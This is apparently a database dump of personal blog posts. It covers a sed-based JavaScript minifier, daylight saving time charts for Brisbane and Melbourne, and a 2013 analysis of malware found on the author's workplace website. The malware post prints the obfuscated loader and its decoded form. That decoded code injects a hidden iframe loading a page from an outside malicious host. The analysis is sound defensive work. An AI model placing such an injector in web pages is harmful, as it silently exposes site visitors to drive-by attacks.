class="kc">undefined</span><span class="p">){</span><span class="nx">t</span><span class="p">.</span><span class="nx">pushState</span><span class="p">({</span><span class="s2">&quot;tag&quot;</span><span class="o">:</span> <span class="nx">locArray</span><span class="p">[</span><span class="mf">3</span><span class="p">]},</span><span class="s2">&quot;theMetaCity - Workshop - &quot;</span><span class="o">+</span><span class="nx">locArray</span><span class="p">[</span><span class="mf">3</span><span class="p">],</span><span class="s2">&quot;/workshop/tag/&quot;</span><span class="o">+</span><span class="nx">locArray</span><span class="p">[</span><span class="mf">3</span><span class="p">]);</span><span class="nx">l</span><span class="p">(</span><span class="nx">locArray</span><span class="p">[</span><span class="mf">3</span><span class="p">]);}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">locArray</span><span class="p">[</span><span class="mf">2</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;&#39;</span><span class="p">){}</span><span class="nx">v</span><span class="o">=</span><span class="kc">false</span><span class="p">;}});</span><span class="sb">`</span>
</pre></div>


<p>One caveat here is that this is not a general purpose minifier. The files it processes need to conform to certain standard formatting: no multi-line comments (using /* */) and code deliberately designed to confuse these obviously (E.G. <code>ar foo,       bar</code>). This is made all the easier for having a single developer on this. hopefully the comments for each line help make sense as to what is going on. The general format is: <code>sed -i</code> to apply sed to a file in place (edit the file and don''t pipe to output), <code>s/foo/bar/</code>, <code>s</code> for substitute (foo with bar) to replace and <code>g</code> to do this to the whole file (globally) and not just once. <code>g</code> can be replaced with a number (n), so the operation is applied n times. The default when omitting g or n is once.</p>
<p>So where does this get us?</p>
<p>| File | presize (b) | postsize (b) |
| :--: | :---------: | :----------: |
| searcher.js | 4701 | 1940 |
| video.js| 12575 | 5069 |
| ga.js | 391 | 391 |
| combined| 17667 | 7400 |</p>
<table>
    <thead>
        <th>file</th>
        <th>presize (b)</th>
        <th>postsize (b)</th>
    </thead>
    <tr>
        <td>searcher.js</td>
        <td>4701</td>
        <td>1940</td>
    </tr>
    <tr>
        <td>video.js</td>
        <td>12575</td>
        <td>5069</td>
    </tr>
    <tr>
        <td>ga.js</td>
        <td>391</td>
        <td>391</td>
    </tr>
    <tr>
        <td>combined</td>
        <td>17667</td>
        <td>7400</td>
    </tr>
</table>

<p>Note the ga.js is Google Analytics, which is already minified and so all we need to do is add it to our tmcscripts.js file, and we are good to go. So what we get here is a file reduced to 41% of its original size and two fewer http requests. Not too bad.</p>
<p>In the next part I will go through automating this as part of the build and deployment.</p>','2014-01-09 21:43:28','2014-01-09 21:43:28','<p>Part two of a fun little series on minifying some JavaScript</p>',2),
	 (5,'Lets make a terrible JS minifier: Part 4','lets-make-a-terrible-js-minifier-part-4','blog','<p>This is the fourth and final part of the minifier write up.</p>
<p>It is important to look and the goal of a minifier and how it is produced as it highlights a lot of the processes that goes into software development. The main lesson to take away from this is that any project, process or program is subject to constraints and goals outside of the program itself and you need to be aware of and reflect upon them.</p>
<p>For example: the minifier''s goal is to reduce the bandwidth and requests needed to download the JavaScript files and to this end it does a pretty good job. But it could be better. Looking over the resulting code there are a number of subtle ways to make it better: we could optimise for variable replacement symbol size, i.e replacing a 5 byte word with a one byte word is better than replaceing a three byte word with a two byte word). One way to make this more efficient would be to count the lengh of each word and multiply it by the number of times each appears and then replace them in a decending maner which would make sure that the most used words have the shrortest replacements.</p>
<p>There are more ways too: selectors that reference CSS classes are not replaced and some of them are quite wordy which could be a few more bytes saved. What about redundant lines? An entire line of code gone is a potentially much better reduction than a word or two. It is a very deep rabbit hole.</p>
<p>Which brings me back to my point. Any decision about how this works or goal you have for it is subject to trade offs in lots of different areas. By working out length by times used, you need a way to be abole to do that: parse it of some kind of hacked up counting scheme, all of which need to be written and maintained and understood by everyone inviolved in the project. All for a few bytes? It might be worth it but you certainly dont get it for free. Same problem with the CSS selectors too: by minifiying them you reduce readability in both languages so now everything is harder to  understand, maintain and extend. Why not automate that? Sure but that is another dependancy or system to maintain and support. If you remove that one line of code, does it make it harder for your you and others to understand what was is intended and what is happening? What about when you need to make changes? Can you find where the bug is with less code?</p>
<p>The point here is there is no one right answer to this. There is however a finite number of hours in the day, wasted time on mis or unclear communication and potentailly lower hanging fruit to grasp for. Make sure you understand the bigger picture of how your project/system/whatever fits in and where your time is best spent.</p>
<p>This concludes the write-up on the minifier. You can see the <a href="/blog/archive" title="theMetaCity archive">whole lot on the archive</a> or using the links at the start of the post.</p>','2014-01-18 21:54:48','2014-01-18 21:54:48','<p>This is the fourth and final part of the minifier write up of a fun little series on minifying some JavaScript</p>',2),
	 (6,'Daylight savings time visualised','daylight-savings-revisited','blog','<p>Every year on the first Sunday of October, the lower East and Southern states and territories of Australia observe Daylight Savings Time (DST). Every year the there is some debate about Queensland adopting the practice. Every year the same arguments get bandied out. Let''s look at what DST actually looks like.</p>
<p>This is the sunrise and sunset times plotted over about two years to a reasonable accuracy for my hometown of Brisbane. Blue area is time with the sun has technical set but twilight may remain; orange is time at work (assuming one hour lunch so start at 8:30am). Interestingly the Summer (and Winter) Solstice does not fall on the day with the earliest and latest sunrise (and latest and earliest rise/set for Winter). You can see this in the image below as the rise and set patterns are not symmetrical. This is due to the elliptical orbit combined with the tilt of the planet, which is a bit off-topic.</p>
<p><img alt="The Brisbane sun time map." src="https://assets.themetacity.com/image/blog/timezonesbrisbane.svg" title="The Brisbane sun time map." /></p>
<p>As you can see, there is a seasonal variation in total daylight time of about two hours. More importantly for daylight savings, the time after work is about two hours (assuming finishing work at 5pm, which I do for the rest of the article).</p>
<p>This is Melbourne:</p>
<p><img alt="The Melbourne sun time map." src="https://assets.themetacity.com/image/blog/timezonesmelbourne.svg" title="The Melbourne sun time map." /></p>
<p>Unsurprisingly, due to being much further South, this city has a much bigger range of daylight times. In Summer there is nearly four hours of sunlight after work, while in Winter there is almost no sun (comparable to Brisbane). Interestingly there is nearly three hours of sunlight in the morning.</p>
<p>This time in the morning is where the impetus for DST comes in: that this time before work is better utalised after work.</p>
<p><img alt="The Melbourne DST sun time map." src="https://assets.themetacity.com/image/blog/timezonesmelbournedtsinc.svg" title="The Melbourne sun time map." /></p>
<p>Perfect: we now have a reasonable mount of daylight before work and nearly five hours of daylight in which to enjoy time not working. Obviously there is no point to doing DST in Winter as there is no ''wasted'' daylight to absorb and getting up in the dark is horrible.</p>
<p>Not everything is perfect though. What happens where DST and non-DST areas need to interact: Southern Queensland and Northern NSW, Western SA and Eastern WA. What about <a href="http://en.wikipedia.org/wiki/Poeppel_Corner" title="Poeppels corner where Quensland, the NT and SA all meet. With three differeent time zones.">three times zones at one place?</a> (yes, no business would take place there).</p>
<p>This highlights the point of DST though: it is a helpful system for workers in an <mark>industrial</mark> economy. It makes no sense for agrarian businesses since cows do not care what time your clock says to get up, you get up with the sun. Farmers need to interact with the outside world however, so they run into industrial and transport workers at some point and so problems arise there.</p>
<p>Indeed, here in Queensland the main resistance is farmers and country workers, saying no while the metropolitan area saying yes. Make sense since those in the west already are an hour (the sun rises an hour later for the same time) behind the east coast and further changes just make things harder. In the last 5 years or so there has been a small lobbying group established (who have also run as a single issue party in the<a href="https://en.wikipedia.org/wiki/Daylight_Saving_for_South_East_Queensland" title="Single issue parties have traditionally not fared very well.">2009 election and 2012 south Brisbane by-election</a>). The split time-zone idea makes sense, and I would be up for a trial which would look like this:</p>
<p><img alt="The Brisbane DST sun time map." src="https://assets.themetacity.com/image/blog/timezonesbrisbanedstinc.svg" title="The Brisbane DST sun time map." /></p>','2014-01-29 22:01:21','2014-01-29 22:01:21','<p>What is Daylight Saving actually doing in Australia?</p>',NULL),
	 (8,'Decoding found malware','decoding-found-malware','blog','<p>Early last year (2013), the main website at work had been compromised and (amongst other things) a malicious script had been inserted. I was able to grab a copy of the scipt, albeit second hand and will go through how it works.</p>
<p>This is how I received the code (or I initially mucked around with it and left it like this, I can not remember).</p>
<div class="codehilite"><pre><span></span><span class="nx">zz</span><span class="o">=</span><span class="s1">&#39;val&#39;</span><span class="p">;</span>
<span class="nx">e</span><span class="o">=</span><span class="k">this</span><span class="p">[</span><span class="nx">fromCharCode</span><span class="p">[</span><span class="s2">&quot;substr&quot;</span><span class="p">](</span><span class="mf">11</span><span class="p">)</span><span class="o">+</span><span class="nx">zz</span><span class="p">];</span>




<span class="nx">zz</span><span class="o">=</span><span class="s1">&#39;val&#39;</span><span class="p">;</span>
<span class="nx">ss</span><span class="o">=</span><span class="p">[];</span>

<span class="nx">e</span><span class="o">=</span><span class="k">this</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="mf">11</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;val&#39;</span><span class="p">);</span>

<span class="nx">n</span><span class="o">=&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mf">3.5</span><span class="nx">$3</span><span class="mf">.5</span><span class="nx">$51</span><span class="mf">.5</span><span class="nx">$50$15$19$49$54</span><span class="mf">.5</span><span class="nx">$48</span><span class="mf">.5</span><span class="nx">$57</span><span class="mf">.5</span><span class="nx">$53</span><span class="mf">.5</span><span class="nx">$49</span><span class="mf">.5</span><span class="nx">$54$57$22$50</span><span class="mf">.5</span><span class="nx">$49</span><span class="mf">.5</span><span class="nx">$57$33</span><span class="mf">.5</span><span class="nx">$53$49</span><span class="mf">.5</span><span class="nx">$53</span><span class="mf">.5</span><span class="nx">$49</span><span class="mf">.5</span><span class="nx">$54$57$56</span><span class="mf">.5</span><span class="nx">$32$59</span><span class="mf">.5</span><span class="nx">$41$47</span><span class="mf">.5</span><span class="nx">$50</span><span class="mf">.5</span><span class="nx">$38$47</span><span class="mf">.5</span><span class="nx">$53</span><span class="mf">.5</span><span class="nx">$49</span><span class="mf">.5</span><span class="nx">$19$18</span><span class="mf">.5</span><span class="nx">$48$54</span><span class="mf">.5</span><span class="nx">$49$59</span><span class="mf">.5</span><span class="nx">$18</span><span class="mf">.5</span><span class="nx">$19</span><span class="mf">.5</span><span class="nx">$44</span><span class="mf">.5</span><span class="nx">$23$45</span><span class="mf">.5</span><span class="nx">$19</span><span class="mf">.5</span><span class="nx">$60</span><span class="mf">.5</span><span class="nx">$5</span><span class="mf">.5</span><span class="nx">$3</span><span class="mf">.5</span><span class="nx">$3</span><span class="mf">.5</span><span class="nx">$3</span><span class="mf">.5</span><span class="nx">$51</span><span class="mf">.5</span><span class="nx">$50$56$47</span><span class="mf">.5</span><span class="nx">$53</span><span class="mf">.5</span><span class="nx">$49</span><span class="mf">.5</span><span class="nx">$56$19$19</span><span class="mf">.5</span><span class="nx">$28</span><span class="mf">.5</span><span class="nx">$5</span><span class="mf">.5</span><span class="nx">$3</span><span class="mf">.5</span><span class="nx">$3</span><span class="mf">.5</span><span class="nx">$61</span><span class="mf">.5</span><span class="nx">$15$49</span><span class="mf">.5</span><span class="nx">$53$56</span><span class="mf">.5</span><span class="nx">$49</span><span class="mf">.5</span><span class="nx">$15$60</span><span class="mf">.5</span><span class="nx">$5</span><span class="mf">.5</span><span class="nx">$3</span><span class="mf">.5</span><span class="nx">$3</span><span class="mf">.5</span><span class="nx">$3</span><span class="mf">.5</span><span class="nx">$49$54</span><span class="mf">.5</span><span class="nx">$48</span><span class="mf">.5</span><span class="nx">$57</span><span class="mf">.5</span><span class="nx">$53</span><span class="mf">.5</span><span class="nx">$49</span><span class="mf">.5</span><span class="nx">$54$57$22$58</span><span class="mf">.5</span><span class="nx">$56$51</span><span class="mf">.5</span><span class="nx">$57$49</span><span class="mf">.5</span><span class="nx">$19$16$29$51</span><span class="mf">.5</span><span class="nx">$50$56$47</span><span class="mf">.5</span><span class="nx">$53</span><span class="mf">.5</span><span class="nx">$49</span><span class="mf">.5</span><span class="nx">$15$56</span><span class="mf">.5</span><span class="nx">$56$48</span><span class="mf">.5</span><span class="nx">$29</span><span class="mf">.5</span><span class="nx">$18</span><span class="mf">.5</span><span class="nx">$51$57$57$55$28$22</span><span class="mf">.5</span><span class="nx">$22</span><span class="mf">.5</span><span class="nx">$53</span><span class="mf">.5</span><span class="nx">$55</span><span class="mf">.5</span><span class="nx">$59</span><span class="mf">.5</span><span class="nx">$49</span><span class="mf">.5</span><span class="nx">$54$57</span><span class="mf">.5</span><span class="nx">$22$49$54$56</span><span class="mf">.5</span><span class="nx">$23$25</span><span class="mf">.5</span><span class="nx">$22$48</span><span class="mf">.5</span><span class="nx">$54</span><span class="mf">.5</span><span class="nx">$53</span><span class="mf">.5</span><span class="nx">$22</span><span class="mf">.5</span><span class="nx">$49$22</span><span class="mf">.5</span><span class="nx">$25$23$25$22$55$51$55$30</span><span class="mf">.5</span><span class="nx">$50</span><span class="mf">.5</span><span class="nx">$54</span><span class="mf">.5</span><span class="nx">$29</span><span class="mf">.5</span><span class="nx">$23</span><span class="mf">.5</span><span class="nx">$18</span><span class="mf">.5</span><span class="nx">$15$58</span><span class="mf">.5</span><span class="nx">$51</span><span class="mf">.5</span><span class="nx">$49$57$51$29</span><span class="mf">.5</span><span class="nx">$18</span><span class="mf">.5</span><span class="nx">$23</span><span class="mf">.5</span><span class="nx">$23$18</span><span class="mf">.5</span><span class="nx">$15$51$49</span><span class="mf">.5</span><span class="nx">$51</span><span class="mf">.5</span><span class="nx">$50</span><span class="mf">.5</span><span class="nx">$51$57$29</span><span class="mf">.5</span><span class="nx">$18</span><span class="mf">.5</span><span class="nx">$23</span><span class="mf">.5</span><span class="nx">$23$18</span><span class="mf">.5</span><span class="nx">$15$56</span><span class="mf">.5</span><span class="nx">$57$59</span><span class="mf">.5</span><span class="nx">$53$49</span><span class="mf">.5</span><span class="nx">$29</span><span class="mf">.5</span><span class="nx">$18</span><span class="mf">.5</span><span class="nx">$58$51</span><span class="mf">.5</span><span class="nx">$56</span><span class="mf">.5</span><span class="nx">$51</span><span class="mf">.5</span><span class="nx">$48$51</span><span class="mf">.5</span><span class="nx">$53$51</span><span class="mf">.5</span><span class="nx">$57$59</span><span class="mf">.5</span><span class="nx">$28$51$51</span><span class="mf">.5</span><span class="nx">$49$49$49</span><span class="mf">.5</span><span class="nx">$54$28</span><span class="mf">.5</span><span class="nx">$55$54</span><span class="mf">.5</span><span class="nx">$56</span><span class="mf">.5</span><span class="nx">$51</span><span class="mf">.5</span><span class="nx">$57$51</span><span class="mf">.5</span><span class="nx">$54</span><span class="mf">.5</span><span class="nx">$54$28$47</span><span class="mf">.5</span><span class="nx">$48$56</span><span class="mf">.5</span><span class="nx">$54</span><span class="mf">.5</span><span class="nx">$53$57</span><span class="mf">.5</span><span class="nx">$57$49</span><span class="mf">.5</span><span class="nx">$28</span><span class="mf">.5</span><span class="nx">$53$49</span><span class="mf">.5</span><span class="nx">$50$57$28$23$28</span><span class="mf">.5</span><span class="nx">$57$54</span><span class="mf">.5</span><span class="nx">$55$28$23$28</span><span class="mf">.5</span><span class="nx">$18</span><span class="mf">.5</span><span class="nx">$30$29$22</span><span class="mf">.5</span><span class="nx">$51</span><span class="mf">.5</span><span class="nx">$50$56$47</span><span class="mf">.5</span><span class="nx">$53</span><span class="mf">.5</span><span class="nx">$49</span><span class="mf">.5</span><span class="nx">$30$16$19</span><span class="mf">.5</span><span class="nx">$28</span><span class="mf">.5</span><span class="nx">$5</span><span class="mf">.5</span><span class="nx">$3</span><span class="mf">.5</span><span class="nx">$3</span><span class="mf">.5</span><span class="nx">$61</span><span class="mf">.5</span><span class="nx">$5</span><span class="mf">.5</span><span class="nx">$3</span><span class="mf">.5</span><span class="nx">$3</span><span class="mf">.5</span><span class="nx">$50$57</span><span class="mf">.5</span><span class="nx">$54$48</span><span class="mf">.5</span><span class="nx">$57$51</span><span class="mf">.5</span><span class="nx">$54</span><span class="mf">.5</span><span class="nx">$54$15$51</span><span class="mf">.5</span><span class="nx">$50$56$47</span><span class="mf">.5</span><span class="nx">$53</span><span class="mf">.5</span><span class="nx">$49</span><span class="mf">.5</span><span class="nx">$56$19$19</span><span class="mf">.5</span><span class="nx">$60</span><span class="mf">.5</span><span class="nx">$5</span><span class="mf">.5</span><span class="nx">$3</span><span class="mf">.5</span><span class="nx">$3</span><span class="mf">.5</span><span class="nx">$3</span><span class="mf">.5</span><span class="nx">$58$47</span><span class="mf">.5</span><span class="nx">$56$15$50$15$29</span><span class="mf">.5</span><span class="nx">$15$49$54</span><span class="mf">.5</span><span class="nx">$48</span><span class="mf">.5</span><span class="nx">$57</span><span class="mf">.5</span><span class="nx">$53</span><span class="mf">.5</span><span class="nx">$49</span><span class="mf">.5</span><span class="nx">$54$57$22$48</span><span class="mf">.5</span><span class="nx">$56$49</span><span class="mf">.5</span><span class="nx">$47</span><span class="mf">.5</span><span class="nx">$57$49</span><span class="mf">.5</span><span class="nx">$33</span><span class="mf">.5</span><span class="nx">$53$49</span><span class="mf">.5</span><span class="nx">$53</span><span class="mf">.5</span><span class="nx">$49</span><span class="mf">.5</span><span class="nx">$54$57$19$18</span><span class="mf">.5</span><span class="nx">$51</span><span class="mf">.5</span><span class="nx">$50$56$47</span><span class="mf">.5</span><span class="nx">$53</span><span class="mf">.5</span><span class="nx">$49</span><span class="mf">.5</span><span class="nx">$18</span><span class="mf">.5</span><span class="nx">$19</span><span class="mf">.5</span><span class="nx">$28</span><span class="mf">.5</span><span class="nx">$50$22$56</span><span class="mf">.5</span><span class="nx">$49</span><span class="mf">.5</span><span class="nx">$57$31</span><span class="mf">.5</span><span class="nx">$57$57$56$51</span><span class="mf">.5</span><span class="nx">$48$57</span><span class="mf">.5</span><span class="nx">$57$49</span><span class="mf">.5</span><span class="nx">$19$18</span><span class="mf">.5</span><span class="nx">$56</span><span class="mf">.5</span><span class="nx">$56$48</span><span class="mf">.5</span><span class="nx">$18</span><span class="mf">.5</span><span class="nx">$21$18</span><span class="mf">.5</span><span class="nx">$51$57$57$55$28$22</span><span class="mf">.5</span><span class="nx">$22</span><span class="mf">.5</span><span class="nx">$53</span><span class="mf">.5</span><span class="nx">$55</span><span class="mf">.5</span><span class="nx">$59</span><span class="mf">.5</span><span class="nx">$49</span><span class="mf">.5</span><span class="nx">$54$57</span><span class="mf">.5</span><span class="nx">$22$49$54$56</span><span class="mf">.5</span><span class="nx">$23$25</span><span class="mf">.5</span><span class="nx">$22$48</span><span class="mf">.5</span><span class="nx">$54</span><span class="mf">.5</span><span class="nx">$53</span><span class="mf">.5</span><span class="nx">$22</span><span class="mf">.5</span><span class="nx">$49$22</span><span class="mf">.5</span><span class="nx">$25$23$25$22$55$51$55$30</span><span class="mf">.5</span><span class="nx">$50</span><span class="mf">.5</span><span class="nx">$54</span><span class="mf">.5</span><span class="nx">$29</span><span class="mf">.5</span><span class="nx">$23</span><span class="mf">.5</span><span class="nx">$18</span><span class="mf">.5</span><span class="nx">$19</span><span class="mf">.5</span><span class="nx">$28</span><span class="mf">.5</span><span class="nx">$50$22$56</span><span class="mf">.5</span><span class="nx">$57$59</span><span class="mf">.5</span><span class="nx">$53$49</span><span class="mf">.5</span><span class="nx">$22$58$51</span><span class="mf">.5</span><span class="nx">$56</span><span class="mf">.5</span><span class="nx">$51</span><span class="mf">.5</span><span class="nx">$48$51</span><span class="mf">.5</span><span class="nx">$53$51</span><span class="mf">.5</span><span class="nx">$57$59</span><span class="mf">.5</span><span class="nx">$29</span><span class="mf">.5</span><span class="nx">$18</span><span class="mf">.5</span><span class="nx">$51$51</span><span class="mf">.5</span><span class="nx">$49$49$49</span><span class="mf">.5</span><span class="nx">$54$18</span><span class="mf">.5</span><span class="nx">$28</span><span class="mf">.5</span><span class="nx">$50$22$56</span><span class="mf">.5</span><span class="nx">$57$59</span><span class="mf">.5</span><span class="nx">$53$49</span><span class="mf">.5</span><span class="nx">$22$55$54</span><span class="mf">.5</span><span class="nx">$56</span><span class="mf">.5</span><span class="nx">$51</span><span class="mf">.5</span><span class="nx">$57$51</span><span class="mf">.5</span><span class="nx">$54</span><span class="mf">.5</span><span class="nx">$54$29</span><span class="mf">.5</span><span class="nx">$18</span><span class="mf">.5</span><span class="nx">$47</span><span class="mf">.5</span><span class="nx">$48$56</span><span class="mf">.5</span><span class="nx">$54</span><span class="mf">.5</span><span class="nx">$53$57</span><span class="mf">.5</span><span class="nx">$57$49</span><span class="mf">.5</span><span class="nx">$18</span><span class="mf">.5</span><span class="nx">$28</span><span class="mf">.5</span><span class="nx">$50$22$56</span><span class="mf">.5</span><span class="nx">$57$59</span><span class="mf">.5</span><span class="nx">$53$49</span><span class="mf">.5</span><span class="nx">$22$53$49</span><span class="mf">.5</span><span class="nx">$50$57$29</span><span class="mf">.5</span><span class="nx">$18</span><span class="mf">.5</span><span class="nx">$23$18</span><span class="mf">.5</span><span class="nx">$28</span><span class="mf">.5</span><span class="nx">$50$22$56</span><span class="mf">.5</span><span class="nx">$57$59</span><span class="mf">.5</span><span class="nx">$53$49</span><span class="mf">.5</span><span class="nx">$22$57$54</span><span class="mf">.5</span><span class="nx">$55$29</span><span class="mf">.5</span><span class="nx">$18</span><span class="mf">.5</span><span class="nx">$23$18</span><span class="mf">.5</span><span class="nx">$28</span><span class="mf">.5</span><span class="nx">$50$22$56</span><span class="mf">.5</span><span class="nx">$49</span><span class="mf">.5</span><span class="nx">$57$31</span><span class="mf">.5</span><span class="nx">$57$57$56$51</span><span class="mf">.5</span><span class="nx">$48$57</span><span class="mf">.5</span><span class="nx">$57$49</span><span class="mf">.5</span><span class="nx">$19$18</span><span class="mf">.5</span><span class="nx">$58</span><span class="mf">.5</span><span class="nx">$51</span><span class="mf">.5</span><span class="nx">$49$57$51$18</span><span class="mf">.5</span><span class="nx">$21$18</span><span class="mf">.5</span><span class="nx">$23</span><span class="mf">.5</span><span class="nx">$23$18</span><span class="mf">.5</span><span class="nx">$19</span><span class="mf">.5</span><span class="nx">$28</span><span class="mf">.5</span><span class="nx">$50$22$56</span><span class="mf">.5</span><span class="nx">$49</span><span class="mf">.5</span><span class="nx">$57$31</span><span class="mf">.5</span><span class="nx">$57$57$56$51</span><span class="mf">.5</span><span class="nx">$48$57</span><span class="mf">.5</span><span class="nx">$57$49</span><span class="mf">.5</span><span class="nx">$19$18</span><span class="mf">.5</span><span class="nx">$51$49</span><span class="mf">.5</span><span class="nx">$51</span><span class="mf">.5</span><span class="nx">$50</span><span class="mf">.5</span><span class="nx">$51$57$18</span><span class="mf">.5</span><span class="nx">$21$18</span><span class="mf">.5</span><span class="nx">$23</span><span class="mf">.5</span><span class="nx">$23$18</span><span class="mf">.5</span><span class="nx">$19</span><span class="mf">.5</span><span class="nx">$28</span><span class="mf">.5</span><span class="nx">$5</span><span class="mf">.5</span><span class="nx">$3</span><span class="mf">.5</span><span class="nx">$3</span><span class="mf">.5</span><span class="nx">$3</span><span class="mf">.5</span><span class="nx">$49$54</span><span class="mf">.5</span><span class="nx">$48</span><span class="mf">.5</span><span class="nx">$57</span><span class="mf">.5</span><span class="nx">$53</span><span class="mf">.5</span><span class="nx">$49</span><span class="mf">.5</span><span class="nx">$54$57$22$50</span><span class="mf">.5</span><span class="nx">$49</span><span class="mf">.5</span><span class="nx">$57$33</span><span class="mf">.5</span><span class="nx">$53$49</span><span class="mf">.5</span><span class="nx">$53</span><span class="mf">.5</span><span class="nx">$49</span><span class="mf">.5</span><span class="nx">$54$57$56</span><span class="mf">.5</span><span class="nx">$32$59</span><span class="mf">.5</span><span class="nx">$41$47</span><span class="mf">.5</span><span class="nx">$50</span><span class="mf">.5</span><span class="nx">$38$47</span><span class="mf">.5</span><span class="nx">$53</span><span class="mf">.5</span><span class="nx">$49</span><span class="mf">.5</span><span class="nx">$19$18</span><span class="mf">.5</span><span class="nx">$48$54</span><span class="mf">.5</span><span class="nx">$49$59</span><span class="mf">.5</span><span class="nx">$18</span><span class="mf">.5</span><span class="nx">$19</span><span class="mf">.5</span><span class="nx">$44</span><span class="mf">.5</span><span class="nx">$23$45</span><span class="mf">.5</span><span class="nx">$22$47</span><span class="mf">.5</span><span class="nx">$55$55$49</span><span class="mf">.5</span><span class="nx">$54$49$32</span><span class="mf">.5</span><span class="nx">$51$51</span><span class="mf">.5</span><span class="nx">$53$49$19$50$19</span><span class="mf">.5</span><span class="nx">$28</span><span class="mf">.5</span><span class="nx">$5</span><span class="mf">.5</span><span class="nx">$3</span><span class="mf">.5</span><span class="nx">$3</span><span class="mf">.5</span><span class="nx">$61</span><span class="mf">.5</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;.</span><span class="nx">split</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">$</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;);</span>

<span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mf">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mf">585</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
    <span class="nx">ss</span><span class="o">=</span><span class="nx">ss</span><span class="o">+</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mf">2</span><span class="o">*</span><span class="p">(</span><span class="mf">1</span><span class="o">+</span><span class="mf">1</span><span class="o">*</span><span class="nx">n</span><span class="p">[</span><span class="nx">i</span><span class="p">]));</span>
<span class="p">}</span>

<span class="nx">e</span><span class="p">(</span><span class="nx">ss</span><span class="p">);</span>
</pre></div>


<p>The code itself is quite straightforward and relies on some fun obfuscation to (presumably) get around detection.</p>
<p><code>51.5$53$49$19$50$19.5$28.5$5.5$3.5$3.5$61.5&amp;quot;.split("$");</code></p>
<p>Is simply a "$" delimited list which contains a bunch of numbers of which about half end in .5.</p>
<div class="codehilite"><pre><span></span><span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mf">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mf">585</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
    <span class="nx">ss</span><span class="o">=</span><span class="nx">ss</span><span class="o">+</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mf">2</span><span class="o">*</span><span class="p">(</span><span class="mf">1</span><span class="o">+</span><span class="mf">1</span><span class="o">*</span><span class="nx">n</span><span class="p">[</span><span class="nx">i</span><span class="p">]));</span>
<span class="p">}</span>
</pre></div>


<p>This is the fun bit: for each number in the list, (starting from the inside out) multiply by one (<code>1*n[i]</code>) doing nothing and then add 1 (5.5 becomes 6.5) and then multiply that by 2. Multiplying by two removes the .5, and so we are guarenteed to integers which is useful as we then run these through the function fromCharCode (this is a messed up part, I think b/c I mucked it up when it was discovered) which converts said integers into their unicode representations. For Unicode representations that look (in this case) like code. Code which can be eval()''d (made from the first couple lines via simple concatenation and also mucked up by me). We end up with:</p>
<div class="codehilite"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">&#39;body&#39;</span><span class="p">)[</span><span class="mf">0</span><span class="p">]){</span>
    <span class="nx">iframer</span><span class="p">();</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;&amp;lt;iframe src=&#39;http://mqyenu.dns05.com/d/404.php?go=1&#39; width=&#39;10&#39; height=&#39;10&#39; style=&#39;visibility:hidden;position:absolute;left:0;top:0;&#39;&amp;gt;&amp;lt;/iframe&amp;gt;&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="kd">function</span> <span class="nx">iframer</span><span class="p">(){</span>
    <span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;iframe&#39;</span><span class="p">);</span><span class="nx">f</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s1">&#39;src&#39;</span><span class="p">,</span><span class="s1">&#39;http://mqyenu.dns05.com/d/404.php?go=1&#39;</span><span class="p">);</span><span class="nx">f</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">visibility</span><span class="o">=</span><span class="s1">&#39;hidden&#39;</span><span class="p">;</span><span class="nx">f</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">position</span><span class="o">=</span><span class="s1">&#39;absolute&#39;</span><span class="p">;</span><span class="nx">f</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">left</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="p">;</span><span class="nx">f</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">top</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="p">;</span><span class="nx">f</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s1">&#39;width&#39;</span><span class="p">,</span><span class="s1">&#39;10&#39;</span><span class="p">);</span><span class="nx">f</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s1">&#39;height&#39;</span><span class="p">,</span><span class="s1">&#39;10&#39;</span><span class="p">);</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">&#39;body&#39;</span><span class="p">)[</span><span class="mf">0</span><span class="p">].</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>


<p>Which inserts an invisible IFrame and runs whatever was returned by the (now defunct) page.</p>
<p>I did this because I wanted to test the screen recording software that comes with Cinnamon I recorded playing around with this. Enjoy.</p>
<video width="640" height="360" controls data-poster="https://assets.themetacity.com/video/foundmalwaredecodeposter.svg">
